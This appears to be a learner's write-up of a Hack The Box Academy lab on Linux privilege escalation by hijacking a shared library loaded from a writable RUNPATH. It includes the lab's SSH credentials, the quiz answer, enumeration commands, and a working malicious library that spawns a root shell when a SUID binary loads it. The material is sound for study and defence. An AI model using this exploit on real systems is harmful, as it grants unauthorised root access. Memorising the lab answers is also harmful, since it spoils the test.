# Section 21 — Shared Object Hijacking (RUNPATH Abuse)

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — glibc version | **`2.27`** |

Found via `ldd --version` → `Ubuntu GLIBC 2.27-3ubuntu1.6`.

---

## Concept

SUID binaries may load shared libraries from custom paths defined by **RUNPATH** (embedded in the binary at compile time). If that path is writable, you can drop a malicious `.so` there — the SUID binary loads it as root, executing your code.

**Attack chain:**
```
SUID binary → loads libshared.so from RUNPATH → RUNPATH dir is writable
→ replace libshared.so with malicious version → run binary → root shell
```

This differs from LD_PRELOAD (§20): here you're replacing a library the binary explicitly depends on, not injecting an extra one via environment variable.

---

## Identify

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check dependencies — look for non-standard .so files
ldd ./payroll
# libshared.so => /development/libshared.so    ← custom library, not in /lib

# Check RUNPATH — where does it look for libraries?
readelf -d ./payroll | grep PATH
# RUNPATH: [/development]

# Is the RUNPATH directory writable?
ls -la /development/
# drwxrwxrwx  ← world-writable = exploitable
```
> The key combo: SUID binary + custom library in RUNPATH + writable RUNPATH directory.

---

## Exploit

**1. Find the function name the binary calls:**
```bash
# Put a dummy library in place to trigger the error
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
# ./payroll: undefined symbol: dbquery    ← this is the function we need to implement
```

**2. Write a malicious library implementing that function:**
```bash
cat > /tmp/hijack.c << 'C'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
C
```
> The function name must match exactly. Use `-p` with `/bin/sh` to preserve SUID privileges.

**3. Compile and place in the RUNPATH directory:**
```bash
gcc /tmp/hijack.c -fPIC -shared -o /development/libshared.so
```

**4. Run the SUID binary:**
```bash
./payroll
# uid=0(root) → root shell
```

---

## Finding the glibc version

```bash
ldd --version                              # quickest — first line shows version
/lib/x86_64-linux-gnu/libc.so.6            # run libc directly — prints version banner
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GLIBC"   # grep for version strings
```

---

## Other Shared Object Hijacking Vectors

| Vector | Identify | Exploit |
|--------|----------|---------|
| **RUNPATH writable** (this lab) | `readelf -d binary \| grep PATH` → writable dir | Replace `.so` in that dir |
| **Missing .so** | `ldd binary` shows `not found` | Create the `.so` in a dir the loader searches |
| **LD_LIBRARY_PATH** via sudo | `sudo -l` shows `env_keep+=LD_LIBRARY_PATH` | Set LD_LIBRARY_PATH to dir with your fake `.so` |
| **/etc/ld.so.conf writable** | `ls -la /etc/ld.so.conf.d/` | Add your dir, run `ldconfig` |
| **DT_RPATH** (older) | `readelf -d binary \| grep RPATH` | Same as RUNPATH but checked before LD_LIBRARY_PATH |

---

## Exam / Engagement Notes

- **SUID binary + `ldd` + `readelf -d`** is the enumeration chain. Any non-standard library in a writable directory = instant root.
- The function name is critical — copy a dummy `.so` into the RUNPATH directory, run the binary, read the `undefined symbol` error to get the exact name.
- Always use `/bin/sh -p` (not `/bin/bash`) to preserve SUID — bash drops privileges by default.
- Compile flags: `-fPIC -shared`. No `-nostartfiles` needed (unlike LD_PRELOAD) since you're implementing a named function, not `_init()`.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. ldd --version -> 2.27                    ✅ (answer to the question)
3. ls -la payroll -> SUID root
   ldd payroll -> libshared.so => /development/libshared.so
   readelf -d payroll | grep PATH -> RUNPATH: [/development]
   ls -la /development/ -> drwxrwxrwx (world-writable)
4. cp /lib/.../libc.so.6 /development/libshared.so ; ./payroll -> undefined symbol: dbquery
5. Write hijack.c with void dbquery() { setuid(0); system("/bin/sh -p"); }
   gcc hijack.c -fPIC -shared -o /development/libshared.so
6. ./payroll -> root shell
```

> One line: SUID binary loads custom `.so` from writable RUNPATH → replace with malicious library implementing the expected function → root.
